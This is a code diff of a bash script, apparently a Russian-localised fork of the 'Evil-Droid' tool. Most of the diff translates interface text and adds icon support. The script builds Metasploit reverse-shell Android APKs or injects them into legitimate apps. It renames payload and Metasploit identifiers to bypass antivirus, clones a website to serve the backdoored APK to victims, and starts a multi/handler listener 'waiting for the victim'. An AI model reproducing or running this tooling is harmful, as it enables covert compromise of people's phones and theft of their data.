@@ -56,7 +56,7 @@ sleep 2
 path=`pwd`
 lanip=`ip route get 1 | awk '{print $NF;exit}'`
 publicip=`dig +short myip.opendns.com @resolver1.opendns.com`
-ver="v0.2"
+ver="v0.3(DarkNode)"
 VAR1=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
 VAR2=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
 VAR3=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Payload.smali renaming
@@ -65,6 +65,7 @@ VAR5=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 2
 VAR6=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 3
 VAR7=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # New name for word 'payload'
 VAR8=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # New name for word 'metasploit'
+ICON='FALSE'
 echo ""
 sleep 1
 # spinner for Metasploit Generator
@@ -84,8 +85,8 @@ spinlong ()
 trap ctrl_c INT
 ctrl_c() {
 clear
-echo -e $red"[*] (Ctrl + C ) Detected, Trying To Exit... "
-echo -e $red"[*] Stopping Services... "
+echo -e $red"[*] (Ctrl + C ) Нажатие обнаружено, Пытыемся выйти... "
+echo -e $red"[*] Остановка службы... "
 apache_svc_stop
 postgresql_stop
 sleep 1
@@ -122,7 +123,7 @@ which xterm > /dev/null 2>&1
 sleep 2
 else
 echo ""
-echo -e $red "[ X ] xterm -> ${RedF}not найден! "
+echo -e $red "[ X ] xterm -> ${RedF}не найден! "
 sleep 2
 echo -e $yellow "[ ! ] Установка Xterm "
 sleep 2
@@ -140,7 +141,7 @@ which zenity > /dev/null 2>&1
 sleep 2
 else
 echo ""
-echo -e $red "[ X ] Zenity -> ${RedF}not найден! "
+echo -e $red "[ X ] Zenity -> ${RedF}не найден! "
 sleep 2
 echo -e $yellow "[ ! ] Установка Zenity "
 sleep 2
@@ -158,7 +159,7 @@ which aapt > /dev/null 2>&1
 sleep 2
 else
 echo ""
-echo -e $red "[ X ] Aapt -> ${RedF}not найден! "
+echo -e $red "[ X ] Aapt -> ${RedF}не найден! "
 sleep 2
 echo -e $yellow "[ ! ] Установка Aapt "
 sleep 2
@@ -177,7 +178,7 @@ which aapt > /dev/null 2>&1
 sleep 2
 else
 echo ""
-echo -e $red "[ X ] Apktool -> ${RedF}not найден! "
+echo -e $red "[ X ] Apktool -> ${RedF}не найден! "
 sleep 2
 echo -e $yellow "[ ! ] Установка Apktool "
 sleep 2
@@ -195,7 +196,7 @@ which aapt > /dev/null 2>&1
 sleep 2
 else
 echo ""
-echo -e $red "[ X ] Zipalign -> ${RedF}not найден! "
+echo -e $red "[ X ] Zipalign -> ${RedF}не найден! "
 sleep 2
 echo -e $yellow "[ ! ] Установка Zipalign "
 sleep 2
@@ -207,7 +208,7 @@ which zipalign > /dev/null 2>&1
 fi
 directory="$path/evilapk"
 if [ ! -d "$directory" ]; then
-	echo "Creating the output directory..."
+	echo "Создание папки для приложений EvilApk ..."
 	mkdir $directory
         sleep 3
 fi
@@ -246,12 +247,12 @@ echo -e $lightgreen "   DarkNode Leet Team - CODEBY.NET   "
 #function lhost
 function get_lhost() 
 {
-  LHOST=$(zenity --title="☢ SET LHOST ☢" --text "Ваш-Локальный_ip_адресс: $lanip ; Ваш_Публичный_ip_адресс: $publicip" --entry-text "$lanip" --entry --width 300 2> /dev/null)
+  LHOST=$(zenity --title="☢ Укажите IP адресс для бекконекта ☢" --text "Ваш- Локальный- ip- адресс: $lanip ; Ваш- Публичный- ip- адресс: $publicip" --entry-text "$lanip" --entry --width 300 2> /dev/null)
 }
 #function lport
 function get_lport() 
 {
-  LPORT=$(zenity --title="☢ SET LPORT ☢" --text "Укажите лоакльный порт для бекконетка (например) : 31337" --entry-text "31337" --entry --width 300 2> /dev/null)
+  LPORT=$(zenity --title="☢ Укажите Порт ☢" --text "Укажите лоакльный порт для бекконетка (например) : 31337" --entry-text "31337" --entry --width 300 2> /dev/null)
 }
 #function payload
 function get_payload()
@@ -265,12 +266,12 @@ function get_payload1()
 #function name
 function payload_name()
 {
- apk_name=$(zenity --title "☢ PAYLOAD NAME ☢" --text "имя вредоносного APK файла : DarkAPK" --entry --entry-text "dark_apk" --width 300 2> /dev/null)
+ apk_name=$(zenity --title "☢ Укажите имя АПК файла ☢" --text "имя вредоносного APK файла : Codeby.NET (Не для копипасты братан! )" --entry --entry-text "codeby_net" --width 300 2> /dev/null)
 }
 #function original apk
 function orig_apk()
 {
- orig=$(zenity --title "☢ ORIGINAL APK ☢" --filename=$path --file-selection --file-filter "*.apk" --text "chose the original (apk)" 2> /dev/null) 
+ orig=$(zenity --title "☢ Внедрения в оригинальное APK ☢" --filename=$path --file-selection --file-filter "*.apk" --text "Укажите оригинальное приложения (apk)" 2> /dev/null) 
 }
 #function generate payload
 function gen_payload()
@@ -278,14 +279,14 @@ function gen_payload()
  echo -e $yellow ""
  echo "[*] Генерируем apk файл (GENERATE apk payload)"
  spinlong
- xterm -T " GENERATE APK PAYLOAD" -e msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android R -o $apk_name.apk > /dev/null 2>&1
+ xterm -T " Создание полезной нагрузки " -e msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android R -o $apk_name.apk > /dev/null 2>&1
 }
 function embed_payload()
 {
  echo -e $yellow ""
  echo "[*] Внедрения APK файла в оригинальное приложения для ANDROID"
  spinlong
- xterm -T " EMBED APK PAYLOAD" -e msfvenom -x $orig -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android R -o $apk_name.apk > /dev/null 2>&1
+ xterm -T " Внедрения в приложения" -e msfvenom -x $orig -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android R -o $apk_name.apk > /dev/null 2>&1
 }
 #function apktool
 function apk_decomp()
@@ -293,7 +294,14 @@ function apk_decomp()
  echo -e $yellow ""
  echo "[*] Декомпиляция APK файла..."
  spinlong
- xterm -T "Decompiling APK" -e apktool d -f -o $path/payload $path/$apk_name.apk > /dev/null 2>&1
+ xterm -T "Декомпиляция APK" -e apktool d -f -o $path/payload $path/$apk_name.apk  > /dev/null 2>&1
+ mkdir payload/res/drawable
+ if [ -f "icon.ico" ]; then
+ cp icon.ico payload/res/drawable/ic_launcher > /dev/null 2>&1
+ ICON='TRUE'
+ fi
+ #echo ""
+ #echo -e $green "Иконка == [ $ICON ]"
  rm $apk_name.apk
 }
 function apk_comp()
@@ -301,7 +309,7 @@ function apk_comp()
  echo -e $yellow ""
  echo "[*] Пересборка APK файла ..."
  spinlong
- xterm -T "Rebuilding APK" -e apktool b $path/payload > /dev/null 2>&1
+ xterm -T "Пересобираем APK" -e apktool b $path/payload > /dev/null 2>&1
  mv payload/dist/$apk_name.apk $path > /dev/null 2>&1
  rm -r payload > /dev/null 2>&1
 }
@@ -346,7 +354,7 @@ function postgresql_start()
 }
 function postgresql_stop()
 {
- service postgresql stop | zenity --progress --pulsate --title "PLEASE WAIT..." --text="Остановка службы PostgreSQL (служба Базы Даных)" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+ service postgresql stop | zenity --progress --pulsate --title "Подождите пожалуйтса..." --text="Остановка службы PostgreSQL (служба Базы Даных)" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
 }
 #function flagged by av & updating smalies
 function flagg()
@@ -374,6 +382,9 @@ function flagg()
  sed -i "s#MainActivity#$apk_name#" payload/res/values/strings.xml
  sed -i '/.SET_WALLPAPER/d' payload/AndroidManifest.xml
  sed -i '/WRITE_SMS/a<uses-permission android:name="android.permission.SET_WALLPAPER"/>' payload/AndroidManifest.xml
+ if [ "$ICON" == "TRUE" ] ; then
+ sed -i 's#<application android:label="@string/app_name">#<application android:label="@string/app_name" android:icon="@drawable/ic_launcher" >#g' payload/AndroidManifest.xml
+ fi
 }
 #function signing apk
 function sign()
@@ -399,7 +410,7 @@ function sign()
  echo -e $yellow 
  echo "[*] Проверка подписи артифактов ..."
  spinlong
- jarsigner -verify -certs $apk_name.apk > /dev/null 2>&1
+ jarsigner -verify -certs $apk_name.apk  > /dev/null 2>&1
  rc=$?
  echo -e $yellow
  echo "[✔] Выполнено."
@@ -417,7 +428,7 @@ function quests()
 {
 while true; do
    echo ""
-   quest=$(zenity --list --title "☢ EVIL-DROID OPTIONS ☢" --text "Создать новый APK файл или попытаться инжектировать оригинальное приложения ?" --radiolist --column "Choose" --column "Option" TRUE "APK-MSF" FALSE "ORIGINAL-APK" --width 305 --height 270 2> /dev/null) 
+   quest=$(zenity --list --title "☢ EVIL-DROID опции  ☢" --text "Создать новый APK файл или попытаться инжектировать оригинальное приложения ?" --radiolist --column "Choose" --column "Option" TRUE "APK-MSF" FALSE "ORIGINAL-APK" --width 305 --height 270 2> /dev/null) 
    case $quest in
    APK-MSF) spinlong;gen_payload;spinlong;apk_decomp;flagg;spinlong;apk_comp;spinlong;sign;return;;
    ORIGINAL-APK) orig_apk;spinlong;embed_payload;return;;
@@ -427,16 +438,16 @@ done
 #function listeners
 function listener()
 {
-  xterm -T "EVIL-DROID MULTI/HANDLER" -fa monaco -fs 10 -bg black -e "msfconsole -x 'use multi/handler; set LHOST $lanip; set LPORT $LPORT; set PAYLOAD $PAYLOAD; exploit'"
+  xterm -T "EVIL-DROID ждем жертву в метасплоите " -fa monaco -fs 10 -bg black -e "msfconsole -x 'use multi/handler; set LHOST $lanip; set LPORT $LPORT; set PAYLOAD $PAYLOAD; exploit'"
 }
 #function clone site
 function clns()
 {
- clone=$(zenity --title "☢ CLONE WEBSITE ☢" --text "Укажите URL адрес сайта для клонирования : " --entry --width 400 2> /dev/null)
+ clone=$(zenity --title "☢ Клонирования сайта ☢" --text "Укажите URL адрес сайта для клонирования : " --entry --width 400 2> /dev/null)
 }
 function index_name()
 {
- index=$(zenity --title "☢ INDEX NAME ☢" --text "укажите имя HTML документа например : DarkNode.html" --entry --entry-text "DarkNode" --width 300 2> /dev/null)
+ index=$(zenity --title "☢ Имя HTML файла  ☢" --text "укажите имя HTML документа например : DarkNode.html" --entry --entry-text "DarkNode" --width 300 2> /dev/null)
  echo -e $yellow ""
  echo "[*] Клонирования веб сайта из URL..."
  spinlong
@@ -452,14 +463,14 @@ function launcher()
  cp $path/evilapk/$apk_name.apk /var/www/html > /dev/null 2>&1
  rm apk_index > /dev/null 2>&1
  rm $index.html > /dev/null 2>&1
- zenity --title "☢ SITE CLONED ☢" --info --text "http://$LHOST/$index.html" --width 400 > /dev/null 2>&1
+ zenity --title "☢ Сайт клонирован! ☢" --info --text "http://$LHOST/$index.html" --width 400 > /dev/null 2>&1
 }
 #function attack verctor
 function atkv()
 {
 while true; do
    echo ""
-   atk_v=$(zenity --list --title "☢ EVIL-DROID OPTIONS ☢" --text "Выберите одну из опций ниже:" --radiolist --column "Choose" --column "Option" TRUE "Multi-Handler" FALSE "Attack-Vector" FALSE "Main-Menu" FALSE "Exit" --width 305 --height 270 2> /dev/null) 
+   atk_v=$(zenity --list --title "☢ EVIL-DROID опции ☢" --text "Выберите одну из опций ниже:" --radiolist --column "Choose" --column "Option" TRUE "Multi-Handler" FALSE "Attack-Vector" FALSE "Main-Menu" FALSE "Exit" --width 305 --height 270 2> /dev/null) 
    case $atk_v in
    Multi-Handler) listener;suite;;
    Attack-Vector) clns;spinlong;index_name;launcher;listener;suite;;
@@ -473,7 +484,7 @@ function suite()
 {
 while true; do
    echo ""
-   suit=$(zenity --list --title "☢ EVIL-DROID OPTIONS ☢" --text "Желаете продолжить работу ?" --radiolist --column "Choose" --column "Option" TRUE "Main-Menu" FALSE "Exit" --width 305 --height 270 2> /dev/null) 
+   suit=$(zenity --list --title "☢ EVIL-DROID опции ☢" --text "Желаете продолжить работу ?" --radiolist --column "Choose" --column "Option" TRUE "Main-Menu" FALSE "Exit" --width 305 --height 270 2> /dev/null) 
    case $suit in
    Main-Menu) clear;main;;
    Exit) echo -e $yellow "";apache_svc_stop;postgresql_stop;echo " Всего доброго братан! Не попадайся !!";echo "";exit;;
@@ -545,11 +556,11 @@ function main()
                 error0
                 sleep 2
                 echo ""
-                zenity --title "☢ EVIL-DROID ☢" --info --text "APK PAYLOAD : $path/evilapk/$apk_name.apk " --width 400 > /dev/null 2>&1
+                zenity --title "☢ EVIL-DROID ☢" --info --text "Путь к сохраненому APK файлу : $path/evilapk/$apk_name.apk " --width 400 > /dev/null 2>&1
                 atkv
                 echo
                 ;;
-            2)  echo -e $lightgreen "[✔] BACKDOOR APK ORIGINAL"
+            2)  echo -e $lightgreen "[✔] Инжектирования оригинального приложения..."
                 echo -e $green
                 get_lhost
                 get_lport
@@ -566,11 +577,11 @@ function main()
                 error
                 sleep 2
                 echo ""
-                zenity --title "☢ EVIL-DROID ☢" --info --text "BACKDOORED APK : $path/evilapk/$apk_name.apk " --width 400 > /dev/null 2>&1
+                zenity --title "☢ EVIL-DROID ☢" --info --text "Инжектированое APK : $path/evilapk/$apk_name.apk " --width 400 > /dev/null 2>&1
                 atkv 
                 echo
                 ;;
-            3)  echo -e $lightgreen "[✔] BYPASS AV APK"
+            3)  echo -e $lightgreen "[✔] Обход антивируса..."
                 echo -e $green
                 get_lhost
                 get_lport
@@ -583,11 +594,11 @@ function main()
                 error
                 sleep 2
                 echo 
-                zenity --title "☢ EVIL-DROID ☢" --info --text "APK SIGNED : $path/evilapk/$apk_name.apk " --width 400 > /dev/null 2>&1
+                zenity --title "☢ EVIL-DROID ☢" --info --text "APK файл подписан : $path/evilapk/$apk_name.apk " --width 400 > /dev/null 2>&1
                 atkv 
                 echo
                 ;;
-            4)  echo -e $lightgreen "[✔] START LISTENER"
+            4)  echo -e $lightgreen "[✔] Запуск Метасплоита"
                 echo -e $green
                 get_lhost
                 get_lport
@@ -598,21 +609,21 @@ function main()
                 suite 
                 echo
                 ;;
-            c)  echo -e $lightgreen "[✔] clean up all files"
+            c)  echo -e $lightgreen "[✔] Очистить все файлы созданые рание"
                 echo
                 clean
                 echo
-                zenity --title "☢ EVIL-DROID ☢" --info --text "All Files Are Removed " --width 400 > /dev/null 2>&1
+                zenity --title "☢ EVIL-DROID ☢" --info --text "Все файлы были удаленны." --width 400 > /dev/null 2>&1
                 echo
                 clear
                 ;;
-            q)  echo -e $yellow " Good Bye !!"
+            q)  echo -e $yellow " Пока братан !!"
                 apache_svc_stop
                 postgresql_stop
                 echo
                 exit 0 
                 ;;
-            *)  echo -e $red  "【X】 Invalid option, please write a valid number【X】"
+            *)  echo -e $red  "【X】 Неправельный параметр, Бро укажи нужную цифру【X】"
                 echo
                 sleep 2
                 ;;
